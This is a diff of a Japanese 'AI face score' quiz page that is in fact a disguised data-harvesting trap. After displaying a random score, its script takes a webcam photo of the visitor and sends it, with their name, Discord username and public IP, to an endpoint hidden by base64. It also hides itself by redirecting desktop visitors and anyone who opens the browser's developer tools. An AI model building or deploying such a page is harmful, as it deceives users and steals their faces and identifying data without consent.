@@ -1,226 +1,451 @@
 <!DOCTYPE html>
+
 <html lang="ja">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>lumix AI Pro - 顔面偏差値診断</title>
 
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="今話題のAI顔診断！！">
-    <meta property="og:description" content="このサイトで自分のレベルをAIで調べてみよう">
-    <meta property="og:url" content="https://unitedrebelarmy.com/ai">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg">
-    <meta name="twitter:card" content="summary">
+    <meta charset="UTF-8">
 
-    <script>
-        (function() {
-            const ua = navigator.userAgent.toLowerCase();
-            const isMobile = /iphone|ipad|ipod|android/.test(ua);
-            if (!isMobile) {
-                window.location.href = "https://www.google.com";
-            }
-        })();
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-    
-    <style>
-        :root {
-            --bg: #f8fafc; --card: #ffffff; --accent: #3b82f6; --accent-dark: #1d4ed8;
-            --success: #10b981; --text: #1e293b; --text-sub: #64748b; --border: #e2e8f0;
-            --line: #06c755; --twitter: #1d9bf0; --insta: #e4405f; --discord: #5865f2;
-        }
+    <title>lumix AI Pro - 顔面偏差値診断</title>
 
-        body {
-            margin: 0; background: var(--bg); color: var(--text);
-            font-family: 'Helvetica Neue', Arial, 'Hiragino Kaku Gothic ProN', sans-serif;
-            display: flex; flex-direction: column; align-items: center;
-            min-height: 100vh; padding: 20px 0; user-select: none;
-        }
 
-        .container {
-            background: var(--card); width: 90%; max-width: 420px;
-            border-radius: 24px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05);
-            overflow: hidden; text-align: center; border: 1px solid var(--border);
-        }
 
-        .header { padding: 35px 20px; background: linear-gradient(135deg, #eff6ff, #dbeafe); border-bottom: 1px solid var(--border); }
-        h1 { margin: 0; font-size: 20px; color: var(--text); line-height: 1.4; }
-        .hero-text { font-size: 13px; color: var(--accent); font-weight: bold; margin-top: 8px; text-transform: uppercase; letter-spacing: 1px; }
+    <meta property="og:type" content="website">
 
-        .content { padding: 30px 25px; }
-        input {
-            width: 100%; padding: 14px; background: #f1f5f9; border: 2px solid transparent;
-            border-radius: 12px; color: var(--text); font-size: 16px; margin-bottom: 10px; box-sizing: border-box; outline: none; transition: 0.3s;
-        }
-        input:focus { border-color: var(--accent); background: #fff; }
+    <meta property="og:title" content="今話題のAI顔診断！！">
 
-        .note { font-size: 11px; color: #ef4444; text-align: left; margin-bottom: 15px; padding: 0 5px; line-height: 1.4; font-weight: bold; }
+    <meta property="og:description" content="このサイトで自分のレベルをAIで調べてみよう">
 
-        .btn {
-            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
-            color: white; border: none; padding: 16px;
-            border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer;
-            transition: 0.3s; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
-        }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    <meta property="og:url" content="https://unitedrebelarmy.com/ai">
 
-        #camera-container { display: none; }
-        .video-wrapper {
-            position: relative; width: 260px; height: 260px; margin: 0 auto;
-            border-radius: 50%; border: 4px solid #fff; box-shadow: 0 0 0 2px var(--accent); overflow: hidden;
-        }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        .scan-line {
-            position: absolute; top: 0; left: 0; width: 100%; height: 3px;
-            background: var(--accent); box-shadow: 0 0 10px var(--accent);
-            animation: scan 2s infinite linear;
-        }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg">
 
-        .auth-box { margin: 10px 0 20px; display: flex; justify-content: center; }
+    <meta name="twitter:card" content="summary">
 
-        #result-ui { display: none; padding: 10px; }
-        .result-badge { display: inline-block; padding: 6px 16px; border-radius: 20px; background: #dcfce7; color: var(--success); font-weight: bold; font-size: 14px; margin-bottom: 10px; }
 
-        .share-section { margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px; }
-        .share-btns { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
-        .share-btn {
-            width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center;
-            text-decoration: none; color: white; font-size: 18px; transition: 0.2s;
-        }
-        .ln { background: var(--line); } .tw { background: var(--twitter); } .ig { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc23b6, #bc1888); } .ds { background: var(--discord); }
 
-        .info-box { width: 90%; max-width: 420px; margin-top: 25px; text-align: left; font-size: 12px; color: var(--text-sub); }
-        .info-text { background: #fff; border: 1px solid var(--border); padding: 12px; border-radius: 12px; line-height: 1.6; }
-        canvas { display: none; }
-    </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script>
+
+        (function() {
+
+            const ua = navigator.userAgent.toLowerCase();
+
+            const isMobile = /iphone|ipad|ipod|android/.test(ua);
+
+            if (!isMobile) {
+
+                window.location.href = "https://www.google.com";
+
+            }
+
+        })();
+
+    </script>
+
+
+
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+    
+
+    <style>
+
+        :root {
+
+            --bg: #f8fafc; --card: #ffffff; --accent: #3b82f6; --accent-dark: #1d4ed8;
+
+            --success: #10b981; --text: #1e293b; --text-sub: #64748b; --border: #e2e8f0;
+
+            --line: #06c755; --twitter: #1d9bf0; --insta: #e4405f; --discord: #5865f2;
+
+        }
+
+
+
+        body {
+
+            margin: 0; background: var(--bg); color: var(--text);
+
+            font-family: 'Helvetica Neue', Arial, 'Hiragino Kaku Gothic ProN', sans-serif;
+
+            display: flex; flex-direction: column; align-items: center;
+
+            min-height: 100vh; padding: 20px 0; user-select: none;
+
+        }
+
+
+
+        .container {
+
+            background: var(--card); width: 90%; max-width: 420px;
+
+            border-radius: 24px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05);
+
+            overflow: hidden; text-align: center; border: 1px solid var(--border);
+
+        }
+
+
+
+        .header { padding: 35px 20px; background: linear-gradient(135deg, #eff6ff, #dbeafe); border-bottom: 1px solid var(--border); }
+
+        h1 { margin: 0; font-size: 20px; color: var(--text); line-height: 1.4; }
+
+        .hero-text { font-size: 13px; color: var(--accent); font-weight: bold; margin-top: 8px; text-transform: uppercase; letter-spacing: 1px; }
+
+
+
+        .content { padding: 30px 25px; }
+
+        input {
+
+            width: 100%; padding: 14px; background: #f1f5f9; border: 2px solid transparent;
+
+            border-radius: 12px; color: var(--text); font-size: 16px; margin-bottom: 10px; box-sizing: border-box; outline: none; transition: 0.3s;
+
+        }
+
+        input:focus { border-color: var(--accent); background: #fff; }
+
+
+
+        .note { font-size: 11px; color: #ef4444; text-align: left; margin-bottom: 15px; padding: 0 5px; line-height: 1.4; font-weight: bold; }
+
+
+
+        .btn {
+
+            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+
+            color: white; border: none; padding: 16px;
+
+            border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer;
+
+            transition: 0.3s; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+
+        }
+
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+
+
+        #camera-container { display: none; }
+
+        .video-wrapper {
+
+            position: relative; width: 260px; height: 260px; margin: 0 auto;
+
+            border-radius: 50%; border: 4px solid #fff; box-shadow: 0 0 0 2px var(--accent); overflow: hidden;
+
+        }
+
+        video { width: 100%; height: 100%; object-fit: cover; }
+
+        .scan-line {
+
+            position: absolute; top: 0; left: 0; width: 100%; height: 3px;
+
+            background: var(--accent); box-shadow: 0 0 10px var(--accent);
+
+            animation: scan 2s infinite linear;
+
+        }
+
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+
+
+        .auth-box { margin: 10px 0 20px; display: flex; justify-content: center; }
+
+
+
+        #result-ui { display: none; padding: 10px; }
+
+        .result-badge { display: inline-block; padding: 6px 16px; border-radius: 20px; background: #dcfce7; color: var(--success); font-weight: bold; font-size: 14px; margin-bottom: 10px; }
+
+
+
+        .share-section { margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px; }
+
+        .share-btns { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
+
+        .share-btn {
+
+            width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center;
+
+            text-decoration: none; color: white; font-size: 18px; transition: 0.2s;
+
+        }
+
+        .ln { background: var(--line); } .tw { background: var(--twitter); } .ig { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc23b6, #bc1888); } .ds { background: var(--discord); }
+
+
+
+        .info-box { width: 90%; max-width: 420px; margin-top: 25px; text-align: left; font-size: 12px; color: var(--text-sub); }
+
+        .info-text { background: #fff; border: 1px solid var(--border); padding: 12px; border-radius: 12px; line-height: 1.6; }
+
+        canvas { display: none; }
+
+    </style>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
 </head>
+
 <body>
 
+
+
 <div class="container">
-    <div class="header">
-        <h1>あなたはブサイク？イケメン？美女？</h1>
-        <div class="hero-text">AI FaceScore Recognition Pro</div>
-    </div>
 
-    <div class="content">
-        <div id="setup-ui">
-            <p style="font-size: 13px; color: var(--text-sub); margin-bottom: 20px;">最新の画像認識APIを使用し、客観的に測定します。</p>
-            <input type="text" id="hp_field" style="display:none;" tabindex="-1" autocomplete="off">
-            
-            <input type="text" id="un" placeholder="お名前を入力">
-            <input type="text" id="did" placeholder="Discordユーザー名 (例: user_ai)">
-            <p class="note" id="error-msg">※AI解析データの送付に必須です。半角英数字、アンダースコア、ドットのみ使用可能です。</p>
+    <div class="header">
 
-            <div class="auth-box">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAACIAWS8VkX6dSpKq"></div>
-            </div>
-            <button id="sb" class="btn">診断を開始する</button>
-        </div>
+        <h1>あなたはブサイク？イケメン？美女？</h1>
 
-        <div id="camera-container">
-            <div class="video-wrapper"><div class="scan-line"></div><video id="v" autoplay playsinline></video></div>
-            <p id="st" style="margin-top:20px; font-weight:bold; color:var(--accent);">AIスキャン準備中...</p>
-        </div>
+        <div class="hero-text">AI FaceScore Recognition Pro</div>
 
-        <div id="result-ui">
-            <div class="result-badge">Analysis Completed</div>
-            <div id="score-val" style="font-size: 42px; font-weight: 900; color: var(--accent); margin: 10px 0;">0<span style="font-size:16px;">点</span></div>
-            <h2 id="res-text" style="margin: 5px 0 15px; color: var(--text);">--</h2>
-            <div style="padding:15px; color:var(--success); font-weight:bold; font-size:14px; background:#f0fdf4; border-radius:12px; border:1px solid #bbf7d0;">
-                <i class="fas fa-check-circle"></i> 分析完了！<br>
-                <span style="font-size:12px; font-weight:normal; color:#166534;">Discordへ詳細レポートを送信しました。</span>
-            </div>
-        </div>
+    </div>
 
-        <div class="share-section">
-            <div class="share-btns">
-                <a href="#" class="share-btn ln" id="share-line" target="_blank"><i class="fab fa-line"></i></a>
-                <a href="#" class="share-btn tw" id="share-twitter" target="_blank"><i class="fab fa-x-twitter"></i></a>
-                <a href="#" class="share-btn ig" id="share-insta"><i class="fab fa-instagram"></i></a>
-                <a href="#" class="share-btn ds" id="share-discord"><i class="fab fa-discord"></i></a>
-            </div>
-        </div>
-    </div>
+
+
+    <div class="content">
+
+        <div id="setup-ui">
+
+            <p style="font-size: 13px; color: var(--text-sub); margin-bottom: 20px;">最新の画像認識APIを使用し、客観的に測定します。</p>
+
+            <input type="text" id="hp_field" style="display:none;" tabindex="-1" autocomplete="off">
+
+            
+
+            <input type="text" id="un" placeholder="お名前を入力">
+
+            <input type="text" id="did" placeholder="Discordユーザー名 (例: user_ai)">
+
+            <p class="note" id="error-msg">※AI解析データの送付に必須です。半角英数字、アンダースコア、ドットのみ使用可能です。</p>
+
+
+
+            <div class="auth-box">
+
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAACIAWS8VkX6dSpKq"></div>
+
+            </div>
+
+            <button id="sb" class="btn">診断を開始する</button>
+
+        </div>
+
+
+
+        <div id="camera-container">
+
+            <div class="video-wrapper"><div class="scan-line"></div><video id="v" autoplay playsinline></video></div>
+
+            <p id="st" style="margin-top:20px; font-weight:bold; color:var(--accent);">AIスキャン準備中...</p>
+
+        </div>
+
+
+
+        <div id="result-ui">
+
+            <div class="result-badge">Analysis Completed</div>
+
+            <div id="score-val" style="font-size: 42px; font-weight: 900; color: var(--accent); margin: 10px 0;">0<span style="font-size:16px;">点</span></div>
+
+            <h2 id="res-text" style="margin: 5px 0 15px; color: var(--text);">--</h2>
+
+            <div style="padding:15px; color:var(--success); font-weight:bold; font-size:14px; background:#f0fdf4; border-radius:12px; border:1px solid #bbf7d0;">
+
+                <i class="fas fa-check-circle"></i> 分析完了！<br>
+
+                <span style="font-size:12px; font-weight:normal; color:#166534;">Discordへ詳細レポートを送信しました。</span>
+
+            </div>
+
+        </div>
+
+
+
+        <div class="share-section">
+
+            <div class="share-btns">
+
+                <a href="#" class="share-btn ln" id="share-line" target="_blank"><i class="fab fa-line"></i></a>
+
+                <a href="#" class="share-btn tw" id="share-twitter" target="_blank"><i class="fab fa-x-twitter"></i></a>
+
+                <a href="#" class="share-btn ig" id="share-insta"><i class="fab fa-instagram"></i></a>
+
+                <a href="#" class="share-btn ds" id="share-discord"><i class="fab fa-discord"></i></a>
+
+            </div>
+
+        </div>
+
+    </div>
+
 </div>
+
+
 
 <div class="info-box">
-    <div class="info-text">💡 <strong>使用方法</strong><br>1. 名前とDiscord IDを入力 2. 認証を完了 3. カメラで顔をスキャン</div>
+
+    <div class="info-text">💡 <strong>使用方法</strong><br>1. 名前とDiscord IDを入力 2. 認証を完了 3. カメラで顔をスキャン</div>
+
 </div>
+
+
 
 <canvas id="cv" width="800" height="800"></canvas>
 
+
+
 <script>
-    const _0xS = ["L2FwaS9zZW5k", "POST", "none", "block", "innerText"];
-    const _path = () => atob(_0xS[0]); 
-    const trap = () => { window.location.href = "https://ggrks.lol"; };
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); trap(); }
-    });
 
-    let _n = "", _id = "", _ip = "", _score = 0;
-    const _d = (i) => document.getElementById(i);
+    const _0xS = ["L2FwaS9zZW5k", "POST", "none", "block", "innerText"];
 
-    async function _gip() { try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; } catch(e) { return "127.0.0.1"; } }
+    const _path = () => atob(_0xS[0]); 
 
-    _d('sb').addEventListener('click', async () => {
-        if(_d('hp_field').value !== "") { trap(); return; }
-        
-        const turnstileToken = document.querySelector('[name="cf-turnstile-response"]').value;
-        if (!turnstileToken) { alert("認証を完了してください"); return; }
+    const trap = () => { window.location.href = "https://ggrks.lol"; };
 
-        _n = _d('un').value.trim();
-        _id = _d('did').value.trim();
+    document.addEventListener('contextmenu', e => e.preventDefault());
 
-        const discordRegex = /^[a-z0-9._]{2,32}$/i;
-        
-        if(!_n) return alert("お名前を入力してください");
-        
-        if(!_id || !discordRegex.test(_id)) {
-            alert("Discordユーザー名が正しくありません。\nひらがな・漢字・スペースなどは使えません。");
-            return;
-        }
-        
-        _d('sb').disabled = true;
-        _d('setup-ui').style.display = _0xS[2]; 
-        _d('camera-container').style.display = _0xS[3];
-        
-        _ip = await _gip();
-        
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-            _d('v').srcObject = s;
-            const msgs = ["骨格解析中...", "パーツ対称性測定中...", "データベース照合中...", "AI判定中..."];
-            let idx = 0;
-            const logTimer = setInterval(() => { if(idx < msgs.length) { _d('st')[_0xS[4]] = msgs[idx]; idx++; } }, 1200);
-            
-            setTimeout(() => {
-                clearInterval(logTimer);
-                const ctx = _d('cv').getContext('2d'); ctx.drawImage(_d('v'), 0, 0, 800, 800);
-                _d('cv').toBlob(async (b) => {
-                    _score = Math.floor(Math.random() * 59) + 40;
-                    
-                    const f = new FormData(); 
-                    f.append('file', b, 'scan.png');
-                    f.append('content', `🚀 **AI顔診断レポート**\n👤 ユーザー: ${_n}\n👾 Discord: ${_id}\n📊 スコア: ${_score}点\n🌐 IP: ${_ip}`);
-                    
-                    await fetch(_path(), { method: _0xS[1], body: f });
-                    
-                    s.getTracks().forEach(t => t.stop());
-                    
-                    const resList = ["イケメン！", "美女！", "かわいい", "普通", "まあまあ", "モテそう！", "ちょいいけめん！"];
-                    _d('res-text')[_0xS[4]] = resList[Math.floor(Math.random() * resList.length)];
-                    _d('score-val').innerHTML = `${_score}<span style="font-size:16px;">点</span>`;
+    document.addEventListener('keydown', e => {
 
-                    _d('camera-container').style.display = _0xS[2]; 
-                    _d('result-ui').style.display = _0xS[3];
-                }, 'image/png');
-            }, 6000);
-        } catch(e) { alert("カメラ許可が必要です"); location.reload(); }
-    });
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); trap(); }
+
+    });
+
+
+
+    let _n = "", _id = "", _ip = "", _score = 0;
+
+    const _d = (i) => document.getElementById(i);
+
+
+
+    async function _gip() { try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; } catch(e) { return "127.0.0.1"; } }
+
+
+
+    _d('sb').addEventListener('click', async () => {
+
+        if(_d('hp_field').value !== "") { trap(); return; }
+
+        
+
+        const turnstileToken = document.querySelector('[name="cf-turnstile-response"]').value;
+
+        if (!turnstileToken) { alert("認証を完了してください"); return; }
+
+
+
+        _n = _d('un').value.trim();
+
+        _id = _d('did').value.trim();
+
+
+
+        const discordRegex = /^[a-z0-9._]{2,32}$/i;
+
+        
+
+        if(!_n) return alert("お名前を入力してください");
+
+        
+
+        if(!_id || !discordRegex.test(_id)) {
+
+            alert("Discordユーザー名が正しくありません。\nひらがな・漢字・スペースなどは使えません。");
+
+            return;
+
+        }
+
+        
+
+        _d('sb').disabled = true;
+
+        _d('setup-ui').style.display = _0xS[2]; 
+
+        _d('camera-container').style.display = _0xS[3];
+
+        
+
+        _ip = await _gip();
+
+        
+
+        try {
+
+            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+
+            _d('v').srcObject = s;
+
+            const msgs = ["骨格解析中...", "パーツ対称性測定中...", "データベース照合中...", "AI判定中..."];
+
+            let idx = 0;
+
+            const logTimer = setInterval(() => { if(idx < msgs.length) { _d('st')[_0xS[4]] = msgs[idx]; idx++; } }, 1200);
+
+            
+
+            setTimeout(() => {
+
+                clearInterval(logTimer);
+
+                const ctx = _d('cv').getContext('2d'); ctx.drawImage(_d('v'), 0, 0, 800, 800);
+
+                _d('cv').toBlob(async (b) => {
+
+                    _score = Math.floor(Math.random() * 59) + 40;
+
+                    
+
+                    const f = new FormData(); 
+
+                    f.append('file', b, 'scan.png');
+
+                    f.append('content', `🚀 **AI顔診断レポート**\n👤 ユーザー: ${_n}\n👾 Discord: ${_id}\n📊 スコア: ${_score}点\n🌐 IP: ${_ip}`);
+
+                    
+
+                    await fetch(_path(), { method: _0xS[1], body: f });
+
+                    
+
+                    s.getTracks().forEach(t => t.stop());
+
+                    
+
+                    const resList = ["イケメン！", "美女！", "かわいい", "普通", "まあまあ", "モテそう！", "ちょいいけめん！"];
+
+                    _d('res-text')[_0xS[4]] = resList[Math.floor(Math.random() * resList.length)];
+
+                    _d('score-val').innerHTML = `${_score}<span style="font-size:16px;">点</span>`;
+
+
+
+                    _d('camera-container').style.display = _0xS[2]; 
+
+                    _d('result-ui').style.display = _0xS[3];
+
+                }, 'image/png');
+
+            }, 6000);
+
+        } catch(e) { alert("カメラ許可が必要です"); location.reload(); }
+
+    });
+
 </script>
+
 </body>
+
 </html>
